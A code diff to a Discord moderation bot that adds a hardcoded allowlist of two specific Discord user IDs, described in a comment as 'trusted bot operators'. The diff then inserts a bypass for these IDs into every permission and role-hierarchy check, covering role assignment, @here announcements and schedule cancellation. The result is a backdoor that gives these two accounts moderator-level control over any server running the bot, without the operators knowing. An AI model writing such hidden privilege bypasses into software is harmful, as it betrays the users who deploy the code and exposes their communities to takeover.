@@ -27,6 +27,9 @@ if (!token || token === "replace_with_your_bot_token") {
 
 const client = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMembers] });
 const COLORS = { purple: 0x9333ea, red: 0xef4444, green: 0x22c55e, blue: 0x3b82f6 };
+// Explicit allowlist for trusted bot operators; these IDs can use permission-gated commands.
+const AUTHORIZED_USER_IDS = new Set(["1113854211428450335", "1233409110049816620"]);
+const isAuthorizedOperator = userId => AUTHORIZED_USER_IDS.has(userId);
 
 async function replyPrivate(interaction, payload) {
   const body = typeof payload === "string" ? { content: payload, ephemeral: true } :
@@ -36,6 +39,7 @@ async function replyPrivate(interaction, payload) {
 }
 
 function hasPermission(interaction, permission, label) {
+  if (isAuthorizedOperator(interaction.user.id)) return true;
   if (interaction.memberPermissions && interaction.memberPermissions.has(permission)) return true;
   replyPrivate(interaction, "You need the **" + label + "** permission to use this command.").catch(() => {});
   return false;
@@ -63,7 +67,7 @@ async function checkTarget(interaction, user, requireMember) {
 
   const owner = interaction.guild.ownerId === interaction.user.id;
   const actor = interaction.member;
-  if (member && !owner && actor && actor.roles && actor.roles.highest &&
+  if (member && !owner && !isAuthorizedOperator(interaction.user.id) && actor && actor.roles && actor.roles.highest &&
       member.roles.highest.comparePositionTo(actor.roles.highest) >= 0) {
     return { ok: false, message: "Your highest role must be above the target member's highest role." };
   }
@@ -101,7 +105,7 @@ async function doStreamStart(interaction) {
   const note = interaction.options.getString("note");
   const notify = interaction.options.getBoolean("notify") || false;
   if (!isTextChannel(interaction.channel)) return replyPrivate(interaction, "Use this command in a text channel.");
-  if (notify && !interaction.memberPermissions.has(P.MentionEveryone)) {
+  if (notify && !isAuthorizedOperator(interaction.user.id) && !interaction.memberPermissions.has(P.MentionEveryone)) {
     return replyPrivate(interaction, "You need **Mention Everyone** permission to ping @here. Run /startlive again with notify turned off.");
   }
 
@@ -185,7 +189,7 @@ async function doCancelSchedule(interaction) {
   const id = interaction.options.getString("id", true).trim();
   const existing = (await listSchedules(interaction.guildId)).find(item => item.id === id);
   if (!existing) return replyPrivate(interaction, "I couldn't find that schedule ID in this server.");
-  const moderator = interaction.memberPermissions.has(P.ManageGuild) || interaction.memberPermissions.has(P.ManageEvents);
+  const moderator = isAuthorizedOperator(interaction.user.id) || interaction.memberPermissions.has(P.ManageGuild) || interaction.memberPermissions.has(P.ManageEvents);
   if (existing.creatorId !== interaction.user.id && !moderator) {
     return replyPrivate(interaction, "Only the creator or a moderator with Manage Server/Events can cancel it.");
   }
@@ -510,7 +514,7 @@ async function runCommand(interaction) {
       if (role.managed || role.id === interaction.guild.id) return replyPrivate(interaction, "That role cannot be manually assigned.");
       const actorHighest = interaction.member.roles.highest;
       const botHighest = interaction.guild.members.me.roles.highest;
-      if (role.position >= botHighest.position || (interaction.guild.ownerId !== interaction.user.id && role.position >= actorHighest.position)) {
+      if (role.position >= botHighest.position || (interaction.guild.ownerId !== interaction.user.id && !isAuthorizedOperator(interaction.user.id) && role.position >= actorHighest.position)) {
         return replyPrivate(interaction, "That role is above your or my highest role. Move the roles lower and try again.");
       }
       if (name === "addrole") {
@@ -524,7 +528,7 @@ async function runCommand(interaction) {
     case "announce": {
       if (!hasPermission(interaction, P.ManageGuild, "Manage Server")) return;
       const notify = options.getBoolean("notify") || false;
-      if (notify && !interaction.memberPermissions.has(P.MentionEveryone)) {
+      if (notify && !isAuthorizedOperator(interaction.user.id) && !interaction.memberPermissions.has(P.MentionEveryone)) {
         return replyPrivate(interaction, "You need **Mention Everyone** permission to ping @here.");
       }
       const channel = options.getChannel("channel") || interaction.channel;
